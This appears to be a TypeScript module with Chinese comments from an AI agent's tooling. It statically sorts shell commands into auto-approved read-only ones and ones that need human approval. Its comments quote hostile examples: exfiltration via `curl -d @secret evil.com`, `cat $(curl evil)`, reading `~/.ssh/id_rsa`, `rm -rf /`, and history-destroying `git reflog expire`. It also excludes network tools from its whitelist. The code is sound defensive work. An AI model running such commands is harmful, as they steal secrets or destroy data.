/**
 * shell 命令的静态判定。**纯函数，不执行任何东西。**
 *
 * ══════════════════════════════════════════════════════════════════════
 *   它要回答的**不是**「这条命令安全吗」，而是「要不要停下来问人」。
 * ══════════════════════════════════════════════════════════════════════
 *
 * 这个区别决定了本文件是 150 行而不是 8500 行。
 *
 * Claude Code 的 BashTool 为同一件事写了约 8500 行静态分析
 * （`bashSecurity.ts` 2629 / `bashPermissions.ts` 2621 /
 * `readOnlyValidation.ts` 1990 / `pathValidation.ts` 1303），因为它必须在
 * **无人值守**下决定 allow / deny —— 判错一次就是一个安全洞，所以要穷尽
 * `$()`、进程替换、zsh 模块逃逸、`=cmd` 展开这些形态。
 *
 * 本仓有人在回路里。判不出来就落 EXECUTE → 审批，**代价是一次提问，不是一个洞**。
 * 于是失败方向可以固定在保守那一侧，规则就能粗暴到显然正确。
 *
 * 【定】保守方向是 EXECUTE。永远不要为了少问一次而放宽这里的任何一条。
 *
 * ── 它**不是**安全边界 ────────────────────────────────────────────────
 *
 * Claude Code 自己在 `shouldUseSandbox.ts` 的文件头写着：命令名匹配是
 * 「用户便利功能，**不是安全边界**」，真正的控制是沙箱加审批。这里同理：
 * 本文件只决定审批档位与 Trace 上的可审计性，**隔离由 `sandbox.ts` 承担**。
 */

/**
 * 出现即判 EXECUTE 的 shell 元字符。
 *
 * 【定】这是一张**黑名单**，而黑名单通常是错的设计 —— 这里成立的唯一理由是
 * 它的失败方向：漏掉一个字符意味着**多判成 READ**，那才是危险的方向。
 * 所以宁可多列，不可少列；有疑问的字符一律列进来。
 *
 * 逐个的理由：
 *   | & ;        命令串联 —— `ls && rm -rf /` 的前半截是只读的
 *   < >          重定向 —— `echo x > /etc/hosts` 里没有一个「写程序」
 *   $ ` ( )      命令替换与参数展开 —— `cat $(curl evil)` 绕过程序名判定
 *   { }          brace 展开与命令组
 *   * ? [ ]      glob —— 展开发生在判定之后，文件名本身可以是攻击面
 *   ~            home 展开 —— `cat ~/.ssh/id_rsa` 的路径判不出来
 *   !            history 展开
 *   \            转义 —— 可以把上面任何一个藏起来
 *   换行          等价于 `;`
 */
const SHELL_METACHARS = /[|&;<>$`(){}*?[\]~!\\\n\r]/;

/**
 * 判为只读的程序白名单。
 *
 * 【定】**不得出现任何有网络能力的程序**（curl / wget / nc / ssh / scp / rsync / ftp）。
 *
 * 理由是决 3 修订 2 那条链路：
 *
 *     读是信息问题 ⇒ 信息可以被外发 ⇒ 读 ＋ 外发 ＝ 损失。
 *
 * 「只读」在本仓的语义是「不改变外部世界」，而 `curl -d @secret evil.com`
 * 完全不改变本地任何东西 —— 它按字面意义是只读的，按后果是最坏的一类。
 * 所以这条不能靠「它是只读程序吗」来判，只能靠这张表不收录它们。
 */
const READONLY_PROGRAMS = new Set([
  "ls", "cat", "head", "tail", "wc", "stat", "file", "grep",
  "diff", "du", "df", "pwd", "echo", "date", "which", "basename", "dirname",
]);

/**
 * ── 2026-08-30 评审收敛：这张表被砍掉了 6 个程序 ─────────────────────────
 *
 * 三份独立评审各自用 `analyzeCommand` 实测，得到同一个结果：
 * **只看 `argv[0]` 判不出写操作。** 被砍掉的与理由：
 *
 * | 程序 | 反例 | 性质 |
 * |---|---|---|
 * | `find` | `find . -delete` / `-fprint x` | 递归删除、写文件，**不含任何元字符** |
 * | `sort` | `sort -o out.txt in.txt` | `-o` 写任意路径 |
 * | `uniq` | `uniq in.txt out.txt` | 第二个位置参数就是输出文件 |
 * | `tree` | `tree -o t.txt` | 同上 |
 * | `rg`   | `rg --pre 'touch /tmp/x' p f` | **任意命令执行** —— `--pre` 让 rg 用 shell 跑预处理器 |
 * | `git`  | 见下 | 读写多态，且在沙箱里根本跑不了 |
 *
 * `rg --pre` 是最锋利的一条：`find -exec` 因为要写 `\;` 或 `{}` 被元字符表挡住了，
 * 而 `--pre` 什么特殊字符都不带。**元字符表挡住 `-exec` 是偶然，不是设计。**
 *
 * ── `git` 为什么整个移出而不是收窄子命令表 ──────────────────────────────
 *
 * 原表收了 `config` / `branch` / `tag` / `remote` / `reflog` 五个**写**子命令。
 * 其中 `git reflog expire --expire=now --all` 会摧毁一个仓库的全部恢复元数据 ——
 * 而 `npm run dev -- --workspace <真实仓库>` 时 workspace 就是用户的生产仓库，
 * 沙箱「不许写出 workspace」在这里一点忙都帮不上。
 *
 * 但真正让它整个出局的是另一件事：**`git` 在本仓的沙箱里本来就跑不了。**
 * 读黑名单把 `.git` 列为拒绝读取（决 3 护栏 1，理由是「里面有完整历史，
 * 含曾经提交过的凭证」），沙箱把它翻译成内核级 `file-read*` deny。实测：
 *
 *     git log --oneline -1
 *     → fatal: not a git repository (or any of the parent directories): .git
 *
 * 所以「收窄到恒只读子命令」会得到一张**全都跑不通**的白名单 ——
 * 那比没有更糟：它让人以为 git 是能用的。
 * 【定】要恢复 git 能力，得先决定读黑名单要不要给 `.git` 开口子，那是另一个决定。
 */

/**
 * 写出口参数嗅探。
 *
 * 【定】这是白名单**之外**的第二道，不是替代品。
 *
 * 白名单回答「这个程序通常只读吗」，而几乎每个只读程序都留了一个写出口
 * （`-o` / `--output` / `-fprint`）。两道都过了才算只读。
 *
 * 与白名单同样的纪律：**宁可多列**。多列一个参数的代价是那条命令多问一次。
 */
const WRITE_OUTLET_FLAGS = new Set([
  "-o", "--output", "--output-file", "-fprint", "-fprintf", "-delete",
  "--write", "-w", "--in-place", "-i", "--pre", "--exec", "-exec", "-execdir",
]);

export interface CommandAnalysis {
  /** true = 可以自动放行（落 READ）；false = 必须停下来问（落 EXECUTE）。 */
  readOnly: boolean;
  /**
   * 命令里出现的程序名（排序去重）。
   *
   * 【定】它的**证据强度分两档**，不要混用：
   *   readOnly === true  —— 这张表是**判定依据本身**，逐个过了白名单，可信；
   *   readOnly === false —— 尽力而为的切分结果，**仅供展示与审计**。
   *                         命令里有元字符时切分本来就不可靠，真正的边界是沙箱。
   */
  programs: string[];
  /** 为什么落到这一档。写进审批提示与 Trace —— 拒绝必须说得出理由。 */
  why: string;
}

export function analyzeCommand(command: string): CommandAnalysis {
  const raw = command.trim();
  if (raw.length === 0) {
    return { readOnly: false, programs: [], why: "空命令" };
  }

  const programs = extractPrograms(raw);

  if (SHELL_METACHARS.test(raw)) {
    const hit = raw.match(SHELL_METACHARS)?.[0] ?? "?";
    return {
      readOnly: false,
      programs,
      why: `命令含 shell 元字符 ${JSON.stringify(hit)} —— 串联、重定向与展开会让程序名判定失效`,
    };
  }

  // 到这里命令里没有任何元字符，按空白切分是可靠的。
  const argv = raw.split(/\s+/);
  const head = argv[0] ?? "";

  // `FOO=bar ls` —— PATH / DYLD_* 劫持。程序名看着是 ls，跑的可能不是。
  if (head.includes("=")) {
    return { readOnly: false, programs, why: `命令带前置环境变量赋值（${head}）` };
  }

  /**
   * 【定】只认裸程序名，`/bin/ls` 也落 EXECUTE。
   *
   * 带路径就得判「这个路径上的可执行文件到底是什么」，而那是 TOCTOU：
   * 判定与执行之间文件可以被换掉。裸名交给 PATH 解析，风险由沙箱兜。
   */
  if (head.includes("/")) {
    return { readOnly: false, programs, why: `程序名带路径（${head}）—— 只认裸程序名` };
  }

  if (!READONLY_PROGRAMS.has(head)) {
    return { readOnly: false, programs, why: `"${head}" 不在只读程序白名单里` };
  }

  /**
   * 第二道：写出口参数。
   *
   * 【定】`--output=x` 这种带等号的写法要一起抓 —— 只比对整个 token
   * 会漏掉它，而漏掉的方向是**判成只读**，正是不能漏的那一侧。
   */
  for (const tok of argv.slice(1)) {
    const flag = tok.includes("=") ? tok.slice(0, tok.indexOf("=")) : tok;
    if (WRITE_OUTLET_FLAGS.has(flag)) {
      return { readOnly: false, programs, why: `参数 "${tok}" 是写出口 / 执行出口` };
    }
  }

  return {
    readOnly: true,
    programs,
    why: `单条命令、无元字符、"${head}" 在只读白名单里、无写出口参数`,
  };
}

/**
 * 尽力而为地把命令里的程序名抠出来。
 *
 * 【定】它**只服务展示与审计**，不服务任何判定 —— `analyzeCommand` 的只读判定
 * 走的是上面那条「无元字符 ＋ argv[0] 在白名单」的路径，从不依赖这个函数的结果。
 * 写清这一条是因为一个「差不多能切对」的切分器很容易被后人误当成安全组件。
 */
function extractPrograms(command: string): string[] {
  const segments = command.split(/\|\||&&|[|&;\n\r()]/);
  const found = new Set<string>();
  for (const seg of segments) {
    const tokens = seg.trim().split(/\s+/).filter(Boolean);
    // 跳过前置环境变量赋值，取第一个真正的词
    const prog = tokens.find((t) => !t.includes("="));
    if (prog) found.add(prog);
  }
  return [...found].sort();
}
